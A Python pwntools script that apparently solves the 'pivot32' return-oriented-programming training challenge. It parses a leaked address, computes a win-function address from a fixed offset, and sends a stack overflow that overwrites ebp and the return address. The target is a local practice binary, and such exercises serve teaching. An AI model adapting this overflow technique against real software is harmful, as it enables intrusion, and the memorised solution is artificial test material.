#!/usr/bin/env python3

import argparse
from pwn import *

argp = argparse.ArgumentParser(description="pwnlib based ROP exploit")
argp.add_argument("-q", "--quiet", action="store_true", help="no pwnlib logging - overrides -l")
argp.add_argument("-g", "--gdb", action="store_true", help="attach process to gdb")
argp.add_argument("-l", "--loglevel", action="store", default="info", help="set pwnlib loglevel")

args = argp.parse_args()

if args.quiet:
    context.log_level = "critical"
else:
    context.log_level = args.loglevel

elf = ELF("./pivot32")
proc = process("./pivot32")

if args.gdb:
    gdb = gdb.attach(proc)

# measurements from one example:
# pivot:            0xf7d02f10
# ret2win:          0xf7f1f974 
# ret2win - pivot:  0x21ca64 

# EXPLOIT 
# get pivot address & calculate ret2win's
proc.recvuntil(b"a place to pivot: ")

pivot = int(proc.recvline(), 16)
log.info("pivot: " + hex(pivot))

ret2win = pivot + 0x21ca64 
log.info("ret2win: " + hex(ret2win))


ropchain = b"Let's just use the stack smash..."

print(proc.recvuntil(b"land there\n> ").decode("utf8"))
log.info("sending ropchain")
proc.send(ropchain)


stack_smash = b">:3 "*10 # padding until just before ebp is overwritten
stack_smash += p32(pivot) # ebp
stack_smash += p32(ret2win) 

print(proc.recvuntil(b"stack smash\n> ").decode("utf8"))
log.info("sending stack smash")
proc.sendline(stack_smash)


print(proc.recvall().decode("utf8"))
